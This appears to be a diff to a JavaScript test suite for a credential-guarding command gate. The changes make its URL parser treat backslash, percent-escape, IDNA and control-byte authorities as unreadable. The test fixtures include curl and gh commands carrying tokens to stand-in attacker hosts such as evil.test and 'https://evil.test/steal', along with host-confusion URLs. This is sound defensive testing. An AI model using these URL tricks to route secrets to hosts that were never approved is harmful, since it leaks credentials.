@@ -257,10 +257,14 @@ console.log('④ THE SHAPE KEY — tool + flags + hosts + entries (decision ④)
     && V.shapeOf(V.planOf({ argv: ['gh', 'issue', 'list', '-R', 'ssh://git@evil.com/o/r'], env: [['GH_TOKEN', M1]] })).userinfo === false
     && V.shapeOf(V.planOf({ argv: ['gh', 'issue', 'view', 'https://ghe.example.test/o/r/issues/1', '-R', 'ghe.example.test/o/r'], env: [['GH_TOKEN', M1]] })).userinfo === false,
     'round 18 (item 1): a http(s) URL carrying userinfo sets shape.userinfo — a quote in the userinfo, a plain user@, curl user:pass@ (the door refuses url_userinfo); an ssh repo spec (git@, go-gh strips it) and a clean https URL do NOT');
-  // the fuzz leg: V.urlParse reads the host EXACTLY as the WHATWG new URL (no hand-written host regex) — and names userinfo / a rejected string the same way
-  { const FUZZ = ["https://ghe.example.test'@evil.test/x", 'https://user@evil.test/x', 'https://u:p@good.com/', 'https://good.com%2eevil.com/', 'http://good.com\u3002evil.com/', 'https://[fd00::1]:8443/x', 'https://host:8443/', 'https://host./', 'https://good.com/path', 'http://127.0.0.1/x', 'postgresql://u@db.internal:5432/x', 'https://'];
+  // the fuzz leg: for a SAFE authority V.urlParse reads the host AND userinfo EXACTLY as the WHATWG new URL (no hand-written host regex); round 24 adds the TOOL-parity law below — an authority holding a byte curl keeps but new URL re-reads is NOT read as new URL reads it
+  { const FUZZ = ["https://ghe.example.test'@evil.test/x", 'https://user@evil.test/x', 'https://u:p@good.com/', 'https://[fd00::1]:8443/x', 'https://host:8443/', 'https://host./', 'https://good.com/path', 'http://127.0.0.1/x', 'postgresql://u@db.internal:5432/x', 'https://'];
     const bad = FUZZ.filter((u) => { let wh = '<bad>', wu = false; try { const w = new URL(u); wh = (w.hostname + (w.port ? ':' + w.port : '')).toLowerCase().replace(/\.$/, '') || '<bad>'; wu = !!(w.username || w.password); } catch {} const r = V.urlParse(u); return (r.bad ? '<bad>' : r.host) !== wh || !!r.userinfo !== wu; });
-    ok(!bad.length, 'round 18 (item 1): V.urlParse reads every URL\'s host AND its userinfo flag EXACTLY as the WHATWG new URL (quotes / @ / %-encoding / IPv6 / ports / unicode dot / trailing dot / a legit postgresql user / empty) — no hand-written host regex', bad.map((u) => [u, V.urlParse(u)])); }
+    ok(!bad.length, 'round 18 (item 1): V.urlParse reads a SAFE URL\'s host AND its userinfo flag EXACTLY as the WHATWG new URL (quotes in userinfo / @ / IPv6 / ports / trailing dot / a legit postgresql user / empty) — no hand-written host regex', bad.map((u) => [u, V.urlParse(u)]));
+    // round 24 (the ONE parser agrees with the TOOL, not the spec): an authority holding a `\\`, a percent-escape, a NUL / control / space, or a non-ASCII byte is BLIND ({ bad }) — curl keeps the byte and connects elsewhere while new URL WOULD read a host (good.com / good.evil.com), so the reader never trusts new URL there
+    const UNSAFE = ['https://good.com%2eevil.com/', 'http://good.com\u3002evil.com/', 'https://good.com\\@evil.com/', 'https://good.com%00.evil.com/', 'http://good.com\u00a0@evil.com/'];
+    const leaky = UNSAFE.filter((u) => !V.urlParse(u).bad);
+    ok(!leaky.length, 'round 24: V.urlParse BLINDS an authority with a byte curl keeps but new URL strips / IDNA-maps / re-reads (a `\\` before @, %2e, a NUL, a non-ASCII space) — new URL reads a host there, the reader never out-parses curl', leaky.map((u) => [u, V.urlParse(u), 'newURL=' + (() => { try { return new URL(u).host; } catch { return '<throws>'; } })()])); }
   // round 19 (item 1 BLOCKER): a <url>/<endpoint> the WHATWG parser REJECTS (port > 65535, a numeric last label, a name > 253 / a label > 63, an empty host) is a BLIND authority ⇒ shape.badHost (bad_host at the door), NEVER a dropped host — gh drops a bad port / dials a non-DNS name, so the token would follow it (the daade1a7 leak: the host vanished from routeHosts and the -R host was approved ok:own). A valid :65535 is a real second host (two_hosts, not bad_host).
   { const bh = (a) => V.shapeOf(V.planOf({ argv: a, env: [['GH_TOKEN', M1]] })).badHost, rh = (a) => V.shapeOf(V.planOf({ argv: a, env: [['GH_TOKEN', M1]] })).routeHosts;
     ok(bh(['gh', 'issue', 'view', 'https://evil.test:99999/o/r/issues/1', '-R', 'ghe.example.test/o/r']) === true
@@ -1202,9 +1206,20 @@ console.log('⑫ THE CARD FACTS — cardFactsOf (lane vault-agent-own r20): stru
     && cfg('url = https://evil.test/steal\n').always === false,
     'round 23 (MAJOR #1): inside a -K template a route directive whose host the WHATWG parser rejects (numeric last label, 64-char label, empty proxy host) is BLIND — «always» withheld, named; unix-socket blinds; proxy1.0 adds its host (RED on 4ff55fb4: always true)', { numeric: cfg('url = https://evil.test.123/steal\n') });
 
-  // round 23 (the refuted finding): a non-ASCII whitespace inside a URL's userinfo ⇒ the host is read PAST it (evil.test), blind/userinfo — never own-host (RED on 4ff55fb4: own-host read, not blind)
+  // round 23/24 (the refuted finding, TIGHTENED): a non-ASCII byte (U+3000) in a URL authority ⇒ BLIND — r23 read the host PAST it (evil.test); r24 names NO host (the reader never out-parses curl's IDNA), so routeHosts is empty and urlParse rejects the token (4ff55fb4 read own-host and sent the value there — a true leak; r23 read evil.test — still a guess; r24 names neither)
   const usp = V.shapeOf(V.planOf({ argv: ['curl', '-s', 'http://own-host\u3000@evil.test/x'], env: [['T', M1]] }));
-  ok(eq(usp.routeHosts, ['evil.test']) && usp.blind === true && usp.userinfo === true, 'round 23 (the refuted finding): a U+3000 in the userinfo is kept in the token ⇒ the host is read as evil.test (blind + userinfo), never own-host (4ff55fb4 read own-host and sent the value there)', { routeHosts: usp.routeHosts, blind: usp.blind });
+  ok(eq(usp.routeHosts, []) && usp.blind === true && usp.userinfo === false && usp.badHost === false && V.urlHostsBad('http://own-host\u3000@evil.test/x') === true, 'round 24: a U+3000 in a URL authority is BLIND — urlParse rejects it, routeHosts names NO host (never own-host, never evil.test), the shape is blind', { routeHosts: usp.routeHosts, blind: usp.blind, userinfo: usp.userinfo });
+
+  // round 24 (the CONFIRMED finding, vault-use-grants r3, wire-proven curl 8.18 + a loopback listener): a URL whose authority WHATWG re-reads differently than curl — a `\\` before @ (WHATWG → `/`, curl keeps it as userinfo and dials the host AFTER it), a percent-escape, an IDNA dot — names NO route host (RED on 0cc421d4: urlHosts read the host new URL saw and routeHosts NAMED it, a host curl would NOT dial — the int-C hazard: a host-keyed grant would match the false host). urlParse BLINDS it (bad), urlHostsBad is true, and for curl (bareHosts) the positional is unread ⇒ routeHosts empty. A safe userinfo / fragment / plain / ssh URL is UNCHANGED.
+  const rh = (url) => { const sh = V.shapeOf(V.planOf({ argv: ['curl', '-s', url], env: [['T', M1]] })); return { routeHosts: sh.routeHosts, blind: sh.blind, userinfo: sh.userinfo, badHost: sh.badHost, urlHosts: V.urlHosts(url), bad: V.urlHostsBad(url) }; };
+  const bs = rh('http://evil-for.test\\@127.0.0.1:9/x'), pc = rh('http://good.com%2eevil.test/x');
+  ok(eq(bs.urlHosts, []) && bs.bad === true && eq(bs.routeHosts, []) && bs.blind === true
+    && eq(pc.urlHosts, []) && pc.bad === true && eq(pc.routeHosts, []) && pc.blind === true,
+    'round 24 (RED on 0cc421d4): the `\\`-before-@ and the %2e authority name NO host — urlHosts [] + urlHostsBad + routeHosts [] (0cc421d4: urlHosts=[evil-for.test]/[good.evil.test], routeHosts NAMED it while curl dialed elsewhere)', { bs, pc });
+  const ui = rh('http://a.b.test@127.0.0.1:9/x'), fr = rh('http://127.0.0.1:9/x#@evil-for.test'), pl = rh('http://good.example.test/x');
+  ok(eq(ui.routeHosts, ['127.0.0.1:9']) && ui.userinfo === true && eq(fr.routeHosts, ['127.0.0.1:9']) && eq(pl.routeHosts, ['good.example.test'])
+    && V.urlParse('ssh://git@code.example.test/o/r').host === 'code.example.test',
+    'round 24 (no over-blinding): a http userinfo URL still reads the host past the LAST @ (127.0.0.1, url_userinfo), a `#@` reads 127.0.0.1 (the fragment is not the host), a plain host and an ssh git@ userinfo are unchanged — the re-parse backstop self-normalises case / default-port / a trailing dot', { ui, fr, pl });
 
   // round 23 (MAJOR #4): every facts string is bounded to CARD_STRING_MAX, a long command rides cmdFull chunks (the client store refuses a string > 2000 ⇒ ask_unfiled on 4ff55fb4, where facts.cmd was head.cmd up to 4096)
   const bigCmd = 'curl -s -d ' + 'x'.repeat(2400) + ' https://api.ok.example/v1/items';
@@ -1215,6 +1230,15 @@ console.log('⑫ THE CARD FACTS — cardFactsOf (lane vault-agent-own r20): stru
     'round 23 (MAJOR #4): every facts string ≤ CARD_STRING_MAX; a 2485-char command rides cmd (cut) + cmdFull chunks that reassemble to it (the client store never throws — 4ff55fb4 handed facts.cmd = head.cmd, which the store refuses over 2000 ⇒ ask_unfiled)', { max: Math.max(...strings), cmdCut: fb.cmdCut });
 }
 
+// round 24: a curl positional whose WHATWG-read host diverges from where curl connects contributes NO route host (the shipped parser blinds it); a copy that stops blinding NAMES the false host ⇒ RED
+function routeClean(Vm) {
+  const bad = [];
+  for (const url of ['http://good.com\\@evil.com/', 'https://good.com%2eevil.test/', 'http://good.com\u3002evil.test/', 'http://good.com%00.evil.test/']) {
+    let sh; try { sh = Vm.shapeOf(Vm.planOf({ argv: ['curl', '-s', url], env: [['T', M1]] })); } catch { sh = { routeHosts: [] }; }
+    if (Vm.urlHosts(url).length || !Vm.urlHostsBad(url) || sh.routeHosts.length) bad.push([url, { urlHosts: Vm.urlHosts(url), bad: Vm.urlHostsBad(url), routeHosts: sh.routeHosts }]);
+  }
+  return bad;
+}
 console.log('⑧ MUTANTS — patched copies of src/vault-run.js must go RED');
 {
   const dir = scratchDir('vault-run-model');
@@ -1252,7 +1276,8 @@ console.log('⑧ MUTANTS — patched copies of src/vault-run.js must go RED');
     ['a lookalike host passes', "  return h === f || h.endsWith('.' + f);", '  return h === f || h.endsWith(f);', ownRoad],
     ['a seen shape passes the host', "  if (!away.length && mode === 'allow' && seen === true)", "  if (mode === 'allow' && seen === true)", ownRoad],
     ['a blind destination passes (the review)', "const destUnknown = (sh) => !sh || sh.blind !== false;", 'const destUnknown = () => false;', ownRoad],
-    ['a backslash hides the host (round 2b: blindAuthority)', '.some(blindAuthority)', '.some(() => false)', ownRoad],   // %2e / IDNA / userinfo-backslash authorities read as a trusted host
+    // round 24: the backslash / %2e / IDNA defense moved INTO the ONE parser (urlParse's AUTHORITY_UNSAFE) — blindAuthority is now a redundant backstop, so its old mutant no longer escapes; this mutant proves the parser's char-check is load-bearing for routeHosts cleanliness (the re-parse backstop and blindAuthority keep the VERDICT blind, but only this clean routeHosts keeps a host-keyed grant at int-C honest)
+    ['the ONE parser does not blind a percent / IDNA authority (round 24)', 'if (AUTHORITY_UNSAFE.test(raw)) return { bad: true };', 'if (false) return { bad: true };', routeClean],
     // round 2 (the brief's RED copies): today's «hosts = [] ⇒ allowed», a cluster remembering a blind shape — and each new read
     ['a known tool naming no host it can read passes (round 2)', '|| !known || !hosts.size || unread ||', '|| !known || unread ||', ownRoad],
     ['a cluster keeps a blind shape after one plain 允许 (round 2)', "{ shapePasses: mode === 'allow' }", '{ shapePasses: true }', ownRoad],
